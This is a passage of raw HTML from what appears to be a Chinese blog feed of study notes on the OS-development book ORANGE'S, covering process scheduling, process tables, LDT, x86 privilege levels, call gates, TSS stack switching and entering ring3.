src="https://img-blog.csdnimg.cn/20200707130938506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><h2 id="6-1-2-未雨绸缪——形成进程的必要考虑"><a class="header-anchor" href="#6-1-2-未雨绸缪——形成进程的必要考虑">¶</a>6.1.2 未雨绸缪——形成进程的必要考虑</h2><p>为了实现进程的调度，我们必须有一个数据结构，记录一个进程的状态。在进程将被挂起的时候，进程信息写入其中；进程重新启动时，这些信息被读取出来。</p><p>更复杂的是，很多情况下进程和进程调度运行在不同的层级上。简化一下，让所有任务运行在 ring1 ，进程切换运行在 ring0 。</p><p>另外，引发进程切换的原因有多种，比如说发生了时钟中断，此时中断处理程序会将控制权交给进程调度模块。这时，如果系统认为应该进行进程切换（也有不应该进行进程切换的时候），进程调度就发生了——当前进程的状态被保存起来，队列中下一个进程被恢复执行。</p><h1>6.2 最简单的进程</h1><p>进程切换时的情形：</p><ol><li><p>一个进程 A 正在运行；</p></li><li><p>这时候时钟中断发生，特权级从 ring1 跳到 ring0 ，开始执行时钟中断处理程序；</p></li><li><p>中断处理程序调用进程调度模块，指定下一个应该运行的进程 B ；</p></li><li><p>当中断处理程序结束时，下一个进程 B 准备就绪并开始运行，特权级又从 ring0 跳回 ring1，如图所示。</p></li><li><p>进程 B 运行中。</p></li></ol><p><img src="https://img-blog.csdnimg.cn/20200722122402364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>要想实现这些功能，必须完成以下几项：</p><ul><li><p>时钟中断处理程序</p></li><li><p>进程调度模块</p></li><li><p>两个进程</p></li></ul><p>先来分析一下，进程 A 切换到进程 B 的过程中，有哪些关键技术需要解决。然后用代码分别实现这几个部分。</p><h2 id="6-2-1-简单进程的关键技术预测"><a class="header-anchor" href="#6-2-1-简单进程的关键技术预测">¶</a>6.2.1 简单进程的关键技术预测</h2><p>在实现简单的进程之前，能够想到的关键技术大致包括下面的内容。</p><ol><li><p>进程的哪些状态需要被保存<br>只有可能被改变的才有保存的必要。进程要运行需要CPU和内存相互协作，而不同进程的内存互不干涉。但是CPU只有一个，不同进程共用一个CPU的一套寄存器。所以，我们要把寄存器的值统统保存起来，在进程被恢复执行时使用。</p></li><li><p>进程的状态何时以及怎样被保存<br>为了保证进程状态完整、不被破坏，要在进程刚刚被挂起时保存所有寄存器的值。<br>用 push 或者 pushad (一条指令可以保存许多寄存器值)。这些代码应该写在时钟中断例程的最顶端，以便中断发生时马上被执行。</p></li><li><p>如何恢复进程B的状态<br>保存用的是 push ，恢复则用 pop 。等所有寄存器的值都已经被恢复，执行指令 iretd ，就回到了进程 B。</p></li><li><p>进程表的引入<br>进程的状态关系到每一次进程挂起和恢复，对于这样重要的数据结构，我们称之为&quot;<strong>进程表</strong>&quot;或者进程控制块 PCB 。通过进程表，我们可以非常方便地进行进程管理。</p><p>这里，中断处理的部分内容必须使用汇编，其他大部分进程管理的内容都可以用C编写——将进程表定义成一个结构体；我们有很多个进程，所以会有很多个进程表，形成一个进程表数组。</p><p><strong>进程表是用来描述进程的，所以它必须独立于进程之外。</strong> 当我们把寄存器值压到进程表内的时候，已经处在进程管理模块之中。</p></li><li><p>进程栈和内核栈<br>当寄存器的值已经被保存到进程表内，进程调度模块就开始执行。但这时 esp 指向何处？我们在进程调度模块中会用到堆栈，而寄存器被压到进程表之后，esp 是指向进程表某处的。接下来进行任何的堆栈操作，都会破坏掉进程表的值，从而在下一次进程恢复时产生严重的错误。</p><p>为解决这个问题，必须将 esp 指向专门的内核栈区域。这样，在短短的进程切换过程中，esp的位置出现在3个不同的区域（下图是整个过程的示意）。</p><p><img src="https://img-blog.csdnimg.cn/20200722170006396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>其中：</p><p>进程栈──进程运行时自身的堆栈。<br>进程表──存储进程状态信息的数据结构。<br>内核栈──进程调度模块运行时使用的堆栈。<br>在具体编写代码的过程中，一定要清楚当前使用的是哪个堆栈，以免破坏掉数据。</p></li><li><p>特权级变换：ring1→→ring0<br>在我们以前的代码中，还没有使用过除 ring0 之外的其他特权级。对于有特权级变换的转移：如果由外层向内层转移时，需要从当前 TSS 中取出内层 ss 和 esp 作为目标代码的 ss 和 esp 。所以，我们必须事先准备好 TSS 。<br>由于每个进程相对独立，我们把涉及到的描述符放在局部描述符表 LDT 中，所以，我们还需要为每个进程准备 LDT 。</p></li><li><p>特权级变换：ring0→→ring1</p><p>刚才的分析过程中，我们假设初始状态是“进程 A 运行中”。可是到目前为止我们的代码完全运行在 ring0 。所以，当我们准备开始第一个进程时，我们面临一个从 ring0 到 ring1 的转移，并启动进程 A 。</p><p>这跟我们从进程 B 恢复的情形很相似，完全可以在准备就绪之后跳转到中断处理程序的后半部分，假装发生了一次时钟中断来启动进程 A ，利用 iretd 来实现 ring0 到 ring1 的转移。</p></li></ol><h2 id="6-3-2-第一步——ring0→→ring1"><a class="header-anchor" href="#6-3-2-第一步——ring0→→ring1">¶</a>6.3.2 第一步——ring0→→ring1</h2><p>在 <code>/kernel</code> 中多了一个 <code>main.c</code> ，里面有个函数 <code>kernel_main( )</code> ，从中有这样一行： <code>restart( );</code> 。它调用的便是代码6.1这一段，<strong>它是进程调度的一部分，同时也是我们的操作系统启动第一个进程时的入口。</strong></p><p>p_proc_ready 是一个指向进程表的指针，存放的便是下一个要启动进程的进程表的地址。而且，其中的内容必然是以图6.7所示的顺序进行存放。这样，才会使 pop 和 popad 指令执行后各寄存器的内容更新一遍。</p><p><img src="https://img-blog.csdnimg.cn/20200722171109182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>在头文件 global.h 中可以找到 p_proc_ready ，其类型是一个结构类型指针 struct s_proc* 。再打开 proc.h ，可以看到 s_proc 这个结构体的第一个成员也是一个结构，叫做 s_stackframe 。我们找到 s_stackframe 这个结构体的声明，它的内容安排与我们的推断完全一致。</p><p>现在我们知道了，进程的状态都被存放在 s_proc 这个结构体中，而且位于前部的是所有相关寄存器的值， s_proc 这个结构应该是我们提到过的“进程表”。当要恢复一个进程时，便将 esp 指向这个结构体的开始处，然后运行一系列的 pop 命令将寄存器值弹出。</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>保护模式-2</title>
      <link href="/2022/11/25/ORANGE&#39;S-3.2/"/>
      <url>/2022/11/25/ORANGE&#39;S-3.2/</url>
      
        <content type="html"><![CDATA[<h1>3.2 保护模式进阶</h1><h2 id="内存访问"><a class="header-anchor" href="#内存访问">¶</a>内存访问</h2><p>保护模式下字符串寻址：写内存的过程中，使用了一个常量 OffsetStrTest = StrTest - $$ ，等价于字符串 StrTest 相对于本节开始处 LABEL_DATA 处的偏移。</p><p>如果我们看下面初始化段描述符的过程，就会发现数据段的基址就是 LABEL_DATA 的物理地址，因此，OffsetStrTest 既是该字符串相对于 LABEL_DATA 的偏移，也是在数据段中的偏移。保护模式下，我们使用的就是这个偏移而不再是实模式下的地址。</p><h2 id="从保护模式到实模式"><a class="header-anchor" href="#从保护模式到实模式">¶</a>从保护模式到实模式</h2><p>chapter3/b/pmtest2.asm 中从实模式到保护模式，需要初始化GDT中的描述符，准备GdtPtr和加载GDTR，关中断，打开A20，修改CR0的PE位，最后一个跳转就可以了。</p><p>而从保护模式返回实模式，也需要做许多工作：</p><ul><li><p>需要加载一个合适的描述符的选择子到段寄存器，以包含合适的段界限和属性；</p></li><li><p>另外，不能从32位代码段中返回实模式，只能从16位代码段中返回。因为无法实现从32位代码段返回时，cs高速缓冲寄存器中的属性符合实模式的要求（实模式不能改变段属性）；</p></li><li><p>结果是新增了 LABEL_DESC_NORMAL 的描述符，对应段 [SECTION .s16code] ，返回实模式之前将该段对应的选择子 SelectNormal 加载到 ds,es,fs,gs,ss 。</p></li><li><p>然后，关闭CR0的 PE 位，进行跳转。</p></li></ul><h2 id="LDT-Local-Descriptor-Table"><a class="header-anchor" href="#LDT-Local-Descriptor-Table">¶</a>LDT(Local Descriptor Table)</h2><p>同GDT一样，LDT简单来说也是一种描述符表，只不过它的选择子的 TI 位必须置为 1 。</p><p>(1) 代码和分析<br>下面的代码来自 chapter3/c/pmtest3.asm ：</p><ul><li><p>增加了两个新的节，一个是新的描述符表LDT [SECTION .ldt] ，其中有一个描述符对应 [SECTION .la] ；[SECTION .la] 是该LDT的代码段，在GDT中无定义；</p></li><li><p>[SECTION .ldt] 在GDT中有对应的描述符 LABEL_DESC_LDT 和选择子，以及描述符的初始化代码；</p></li><li><p>[SECTION .la] 中将打印字符 L ，实现时调用了GDT中的 SelectorVideo ；</p></li></ul><p><img src="https://img-blog.csdnimg.cn/2020071117543229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200711175446977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200711175502819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>在运用LDT时，需要先用 lldt 指令加载 ldtr ，lldt 的操作数是 Selector ，对应的是 GDT 中用来描述 LDT 的描述符 LABEL_DESC_LDT (lgdt [GdtPtr] 加载 gdtr ，其操作数是一个 GdtPtr 的数据结构)。也就等同于LDT是GDT中描述的一个段，对应特别的寄存器ldtr，该段中又有描述符描述一些LDT段，只属于这个LDT段。</p><p>另外，此处的LDT有一个描述符LABEL_LDT_DESC_CODEA ，和GDT中的描述符没有区别；但是选择子却有不同，SelectorLDTCodeA 多了一个属性 SA_TIL —— 定义在 pm.inc ，SA_TIL EQU 4 。这是区别GDT和LDT选择子的关键所在，加上这个属性，会使得选择子 SelectorLDTCodeA 的 TI 位被置为 1。</p><h3 id="LDT总结"><a class="header-anchor" href="#LDT总结">¶</a>LDT总结</h3><p>上例的LDT很简单，只有一个代码段。我们完全可以在其中增加更多的段，比如数据段、堆栈段等，我们甚至可以把一个单独任务用到的所有东西都封装在一个LDT中，这种思想是后面章节中的多任务处理的一个雏形。</p><p>增加一个用LDT描述的任务的整个步骤如下：</p><ol><li><p>增加一个32位的代码段；本节代码中原本的那个32位的代码段 [SECTION .32] 用来从实模式跳入保护模式，然后从该段中跳入LDT代码段 [SECTION .la] ；如果有更多的任务，就需要增加新的LDT代码段；最后一个LDT代码段，负责跳回到GDT中描述的16位代码段，然后返回实模式。</p></li><li><p>增加一个LDT段，内容是LDT描述符表，可以有多个描述符描述多个段；注意，使用选择子的时候 TI 位为 1；</p></li><li><p>在GDT中新增一个描述符，用来描述这个新的LDT，同时定义其选择子；</p></li><li><p>增加GDT中新的描述符的初始化代码，主要用来设置段基址；</p></li><li><p>用新加的LDT描述的局部任务准备完毕；</p></li><li><p>先用 lldt 加载 ldtr ，用 jmp 指令跳转等运行。</p></li></ol><h2 id="特权级概述"><a class="header-anchor" href="#特权级概述">¶</a>特权级概述</h2><p>描述符属性中的 DPL (Descriptor Privilege Level)和选择子中的 RPL (Requested Privilege Level) 都是用来表示特权级的。前面所有代码都运行在最高特权级下——DPL=RPL=0 。</p><p>在 IA32 的段式内存机制中，特权级从高到低是 0~3 ，如下图。核心代码和数据，被放置在高特权级中，用以防止低特权级任务在不被允许的情况下访问高特权级的段：</p><p><img src="https://img-blog.csdnimg.cn/20200704181955919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><h3 id="CPL、DPL、RPL"><a class="header-anchor" href="#CPL、DPL、RPL">¶</a>CPL、DPL、RPL</h3><p>通过识别 CPL (Current Privilege Level) 和 DPL,RPL 三种特权级，处理器进行特权级检验。</p><ol><li><p>CPL 当前执行的程序或任务的特权级：</p><p>它存储于 CS和SS 的第 0,1 两位上，通常情况下CPL等于代码所在段的特权级；<br>程序转移到不同特权级的代码段时，CPL会被处理器改变；<br>转移到一致代码段时，CPL则会延续不变，因为一致代码段可以被相同或低特权级的代码访问</p></li><li><p>DPL(Descriptor Privilege Level) 段或者门的特权级：</p><p>它被存储在 段描述符或者门描述符 的 DPL 字段中；<br>当前代码段试图访问一个段或者门的时候，DPL 将会和 CPL 以及段/门选择子的 RPL 进行比较。访问的段或门类型的不同，DPL将会被区别对待：<br>数据段：DPL 规定了可以访问该段的最低特权级。比如某数据段 DPL=1 ，则只有运行在 CPL=0/1 的程序可以访问它；<br>非一致代码段(不使用调用门的情况下)：DPL 规定访问此段的特权级。比如，一个非一致代码段的特权级是 0 ，则只有 CPL=0 的程序可以访问它；<br>调用门：DPL 规定了当前执行的程序或任务可以访问此调用门的最低特权级；<br>一致代码段和通过调用门访问的非一致代码段：DPL 规定了访问此段的最高特权级，如果一致代码段的 DPL 是 2 ，则 CPL=0/1 的程序将无法访问此段；<br>TSS：DPL 规定了访问此 TSS 的最低特权级。(Task State Segment)<br>总的来说，数据段、调用门、TSS三者的DPL规则是一致的。</p></li><li><p>RPL (Requested Privilege Level)</p><p>它存在于段选择子的 0,1 位，根据代码中不同段的跳转来确定，以动态刷新 CPL ；<br>处理器通过检查 RPL,CPL 确认一个访问请求是否合法，不仅提出访问请求的段需要有足够的CPL特权级，RPL也要够高。如果RPL&gt;CPL(RPL特权级更低)，RPL对访问合法性其决定作用，反之亦然；<br>操作系统用RPL避免低特权级程序访问高特权级的数据：<br>(操作系统过程)被调用过程从一个(应用程序)调用过程中接受到一个选择子时，会将选择子的RPL设置为调用者的特权级；<br>然后，操作系统用这个选择子访问特殊的段时，处理器会用调用过程的RPL（已存储到CPL中），而不是更高的操作系统过程的特权级CPL进行特权检验。</p></li></ol><h3 id="不同特权级代码段之间的转移"><a class="header-anchor" href="#不同特权级代码段之间的转移">¶</a>不同特权级代码段之间的转移</h3><p>这里，我们会看一下不同特权级代码段之间的转移情况。</p><p>从一个代码段转移到另一个代码段之前，目标代码段的选择子会被加载到 cs 中；<br>然后，处理器将检查段描述符的界限、类型、特权级等；<br>如果检验成功，cs 会被加载，程序控制权转移到新的代码段中，从 eip 指示的位置开始执行。<br>程序控制转移的发生，常常由 jmp, call, ret, sysenter, sysexit, int n, iret 引起，亦可能是中断和异常处理机制引起。其中，使用 jmp,call 可以实现4种转移：</p><p>目标操作数包含目标代码段的段选择子；<br>目标操作数指向一个包含目标代码段选择子的调用门描述符；<br>目标操作数指向一个包含目标代码段选择子的TSS；<br>目标操作数指向一个任务门，该任务门指向一个包含目标代码段选择子的TSS。<br>其中，第一种是通过 jmp,call 的直接转移，是一类；另外三种是通过某个描述符的间接转移，是第二类。下面将开始详细的阐述。</p><h2 id="特权级转移"><a class="header-anchor" href="#特权级转移">¶</a>特权级转移</h2><h3 id="1-通过jmp或者call进行直接转移"><a class="header-anchor" href="#1-通过jmp或者call进行直接转移">¶</a>(1) 通过jmp或者call进行直接转移</h3><p>通过前面的讨论，我们可以总结出下面的规则：</p><ul><li><p>目标代码段是非一致代码段，则要求 CPL 必须等于目标段的 DPL ，同时 RPL &lt;= DPL ；</p></li><li><p>目标代码段是一致代码段，则要求 CPL 必须小于等于目标段的 DPL，RPL 不做检查。转移到目标段后，CPL 不会变成目标代码段的 DPL 。</p></li><li><p>这样，jmp和call进行的代码段间直接转移很有限：</p><ul><li><p>对于非一致代码段，只能够在相同特权级代码段间转移；</p></li><li><p>对于一致代码段，最多能从低到高，而且 CPL 不会改变。</p></li></ul></li></ul><h3 id="2-调用门体验"><a class="header-anchor" href="#2-调用门体验">¶</a>(2) 调用门体验</h3><p>门也是一种描述符 Gate Descriptor ，其结构如下，和之前提到的描述符很不相同：</p><p><img src="https://img-blog.csdnimg.cn/20200713001239272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>直观来看，一个门描述符定义了目标代码对应段的一个选择子、入口地址偏移指定的线性地址(程序通过这个地址进行转移)、一些属性，属性中 BYTE5 和以前的描述符完全相同，S 位固定为零。门描述符的类型有四种：</p><ul><li><p>调用门 Call Gates</p></li><li><p>中断门 Interrupt Gates</p></li><li><p>陷阱门 Trap Gates</p></li><li><p>任务门 Task Gates</p></li></ul><p>中断门和陷阱门是特殊的，先不介绍，而是先介绍调用门。下面的例子用到调用门<strong>但先不涉及特权级转换</strong>。在 <code>pmtest3.asm</code> 的基础上增加一个代码段，<strong>作为通过调用门转移的目标段</strong>：(<code>ch3/d/pmtest4.asm</code>)</p><p><img src="https://img-blog.csdnimg.cn/2020071301374537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>我们注意到，代码末尾是 <code>retf</code> 指令，因为我们要用call指令调用这个建立的调用门。下面加入代码段的描述符、选择子、及初始化这个描述符的代码：</p><p><img src="https://img-blog.csdnimg.cn/20200713111545273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>调用门的代码，门描述符的属性为 <code>DA_386CGate</code> ，表明是一个调用门；选择子是 <code>SelectorCodeDest</code> ，表明目标代码段是刚刚添加的代码段；偏移地址是 <code>0</code> ，即跳转到目标段的开头；另外，<code>DPL=0</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; 门</span><br><span class="line">LABEL_CALL_GATE_TEST: Gate SelectorCodeDest, 0, 0, DA_386CGate + DA_DPL0</span><br></pre></td></tr></table></figure><p>上面，我们完成了准备调用门的工作，门指向 SelectorCodeDest:0 即标号 LABEL_SEG_CODE_DEST 处的代码。然后，用call使用它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">; 测试调用门(无特权级变换), 打印字符&#x27;C&#x27;</span><br><span class="line">call SelectorCallGateTest:0</span><br><span class="line">...</span><br><span class="line">jmp  SelectorLDTCodeA:0    ; 跳入局部任务, 打印字符&#x27;L&#x27;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>调用门本质上是一个入口地址，只是增加了一些属性罢了。上面的例子中调用门完全等同于一个地址，可以将<strong>使用调用门进行跳转</strong>的指令改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call SelectorCodeDest:0</span><br></pre></td></tr></table></figure><p>如果我们想要在不同的特权级代码间转移的话，还需要学习<strong>使用调用门进行转移时特权级检验</strong>的规则：</p><ul><li><p>调用一个调用门G，从代码A转移到代码B(调用门G中目标选择子指向的段)，中间涉及到了 CPL 、RPL 、G的DPL（DPL_G）、B的DPL（DPL_B）；</p></li><li><p>代码A访问G调用门时，其规则等同于访问一个数据段，要求 CPL，RPL &lt;= DPL_G 。即 CPL，RPL 要在更高的特权级上；</p></li><li><p>此外，系统还要比较 CPL 和 DPL_B 。如果是一致代码段，则 DPL_B &lt;= CPL，即 CPL 特权级要么相等要么较低；如果是非一致代码段，则jmp和call有所不同，call时要求 DPL_B &lt;= CPL ；jmp时只能是 DPL_B = CPL 。</p></li><li><p>也就是说，通过调用门和CALL，无论目标是一致还是非一致代码段，都可以实现从低特权级到高特权级的跨越。</p></li></ul><p>总的来说，<strong>调用门使用时特权级检验</strong>规则如下：</p><p><img src="https://img-blog.csdnimg.cn/20200713143913154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><h3 id="3-长短调用时的堆栈变化"><a class="header-anchor" href="#3-长短调用时的堆栈变化">¶</a>(3) 长短调用时的堆栈变化</h3><p>长跳转/调用 far jmp/call 和短跳转/调用 near jmp/call 的不同：</p><ul><li><p>对于jmp来说，长跳转对应段间，短跳转对应段内，结果没什么不同；</p></li><li><p>对于call来说，由于call指令会影响堆栈，长短调用对堆栈的影响也不同。</p><ul><li><p>对于短调用，先是将参数依次入栈，call执行将下一条指令 nop 的地址——调用者eip 压入栈，对应下图的 esp (指向当前堆栈的栈顶)的变化：</p><p><img src="https://img-blog.csdnimg.cn/20200713150000549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>然后，到ret执行时，这个 <code>eip</code> 会从堆栈被弹出，执行前后的 <code>esp</code> 变化如下：</p><p><img src="https://img-blog.csdnimg.cn/20200713151158530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p></li><li><p>长调用的情况类似，不过由于跨了段，因此在call指向时压入栈的不仅有 <code>eip</code> (下一条指令的地址)，还有 <code>cs</code></p><p><img src="https://img-blog.csdnimg.cn/20200713151402894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>ret执行后返回，需要调用者的 <code>cs</code> 和 <code>eip</code> ，因此弹出两者：</p><p><img src="https://img-blog.csdnimg.cn/20200713151531685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p></li></ul></li></ul><h3 id="4-特权级变换时的堆栈变化"><a class="header-anchor" href="#4-特权级变换时的堆栈变化">¶</a>(4) 特权级变换时的堆栈变化</h3><p>联系起通过调用门的转移，我们很容易想到，call一个调用门也是长调用。但是不同的是，特权级变化的时候，堆栈也要发生切换，即call执行前后的堆栈不再是同一个。</p><p>处理器的这种机制避免了高特权级的过程由于栈空间不足而崩溃；另外，如果不同特权级共享同一个堆栈的话，高特权级程序可能因此受到有意或无意的干扰。无疑，这也是一种保护。</p><p>但是这种变化也给我们带来了困扰，如果我们压入参数和返回时地址，需要使用的时候却发现堆栈已经变成了另外一个，该怎么办呢？Intel提供了一种机制——将堆栈A的内容复制到堆栈B中，如下图：</p><p><img src="https://img-blog.csdnimg.cn/2020071315254220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>上面仅仅涉及到两个堆栈，但是，由于每个任务最多可能在4个特权级间切换，因此每个任务实际需要4个堆栈。无奈我们只有一个 ss 和一个 esp ，如果发生堆栈切换，该从哪里得到其他堆栈的 ss,esp 呢？这里涉及到 TSS (Task-State Segment)，它是一个数据结构，包含多个字段。32位TSS如下图：</p><p><img src="https://img-blog.csdnimg.cn/20200713153737723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><blockquote><p>cs是代码段寄存器<br>存放当前正在运行的程序代码所在段的段基址，表示当前使用的指令代码可以从该段寄存器指定的存储器段中取得，相应的偏移量则由IP提供。</p><p>ds是数据段寄存器<br>当前程序使用的数据所存放段的最低地址，即存放数据段的段基址</p><p>ss是堆栈段寄存器<br>当前堆栈的底部地址，即存放堆栈段的段基址</p><p>es是扩展段寄存器<br>当前程序使用附加数据段的段基址，该段是串操作指令中目的串所在的段</p><p>gs是全局段寄存器</p><p>gs是80386起增加的两个辅助段寄存器之一,在这之前只有一个辅助段寄存器ES</p><p>fs是标志段寄存器</p></blockquote><p>重点关注偏移4到偏移27的3个 ss 和3个 esp 。当发生堆栈切换时，内层的 ss 和 esp 就是从这里取得的。如果我们从 ring3-&gt;ring1 ，堆栈将自动切换到 ss1,esp1 指定的位置。由于只是从低特权级到高特权级切换时新堆栈才会从TSS中取得，所以TSS中没有位于最外层的 ring3 (最低特权级) 的堆栈信息。</p><p>书上总结了CPU在整个转移过程中做的工作，即调用门从外层到内层的全过程：</p><ol><li><p>根据目标代码段的 DP (新的 CPL) 从 TSS 中选择应该切换到哪个 ss,esp ；</p></li><li><p>从 TSS 中读取新的 ss,esp 。如果发现 ss,esp 或者 TSS 界限错误都会报无效TSS异常(#TS)；</p></li><li><p>对 ss 描述符进行检验，如果错误，同样发生 #TS 异常；</p></li><li><p>暂时保存当前 ss,esp 的值；</p></li><li><p>加载新的 ss,esp ；</p></li><li><p>将刚刚保存下来的 ss,esp 的值压入新的 ss,esp 指向的新栈；</p></li><li><p>从调用者堆栈中将参数复制到被调用者堆栈(新堆栈)中，复制参数的数目由调用门中 ParamCount 来决定，如果是零的话，不复制参数；ParamCount 有5个字节，最大可以表示31个参数，更大时需要让其中的一个参数变成指向一个数据结构的指针，或者通过保存在新堆栈中的 ss,esp 访问旧堆栈中的参数；</p></li><li><p>将当前的 cs,eip 压入新栈；</p></li><li><p>加载调用门中指定的新的 cs,eip ，开始执行被调用者过程。</p></li></ol><p>反过来，ret是call的反过程，只是带参数的ret指令会同时释放事先被压栈的参数。ret不仅可以实现长短返回，而且可以实现带有特权级变换的长返回。由被调用者到调用者的返回过程如下：</p><ol><li><p>检查保存的 cs 上的 RPL 以判断返回时是否需要变换特权级；</p></li><li><p>加载被调用者堆栈上的 cs, eip ，进行代码段描述符和选择子类型与特权级检验；</p></li><li><p>如果ret指令含有参数，则增加 esp 的值跳过参数。然后 esp 指向被保存过的调用者的 ss, esp 。注意，ret的参数必须对应调用门中的 ParamCount 的值；</p></li><li><p>加载 ss, esp ，切换到调用者堆栈，被调用者的 ss, esp 被丢弃。这里将进行 ss 描述符、esp 以及 ss 段描述符的检验；</p></li><li><p>如果ret指令含有参数，增加 esp 的值跳过参数，此时已经处于调用者堆栈中；</p></li><li><p>检查 ds, es, fs, gs 的值，如果哪个寄存器指向的段的 DPL &lt; CPL ，则加载一个空描述符到对应寄存器。此规则不适用于一致代码段。</p></li></ol><h3 id="5-进入ring3"><a class="header-anchor" href="#5-进入ring3">¶</a>(5) 进入ring3</h3><p>在ret执行前，堆栈中应该准备好了目标代码段的 <code>cs,eip</code> ，以及 <code>ss, esp</code> 和参数等。我们的例子中，ret前的参数如下：</p><p><img src="https://img-blog.csdnimg.cn/2020071319074421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>执行完ret之后，就可以转移到低特权级代码中了。在pmtest4.asm 基础上做一下修改，形成 pmtest5a.asm 。</p><p>首先添加一个 ring3 的代码段 [SECTION .ring3] 和一个 ring3 的堆栈段 [SECTION .s3] ，代码段很简单，同样是打印一个字符，会在&quot;In Protect Mode now.&quot;下方显示。不过由于其运行在 ring3 ，但是写显存要访问 VIDEO 段，为了避免错误，我们把 VIDEO 的 DPL 改为3。同时，新的代码段对应描述符的属性加上 DA_DPL3 ，相应选择子的 SA_RPL3 也将 RPL 设为了3:</p><p><img src="https://img-blog.csdnimg.cn/20200713191600966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215UmVhbGl6YXRpb24=,size_16,color_FFFFFF,t_70" alt></p><p>这样，代码段和堆栈段都准备好了，现在将 <code>ss, esp, cs, eip</code> 依次压栈，执行 <code>retf</code> 指令：</p><p><img src="https://img-blog.csdnimg.cn/20200713192642131.png" alt></p><p>至此实现由ring0到ring3、从高特权级到低特权级的转移。</p><h3 id="6-通过调用门进行有特权级变换的转移"><a class="header-anchor" href="#6-通过调用门进行有特权级变换的转移">¶</a>(6) 通过调用门进行有特权级变换的转移</h3><p>在 <code>[SECTION .ring3]</code> 中增加了使用调用门的代码，修改调用门的描述符和选择子使其满足 <code>CPL, RPL</code> 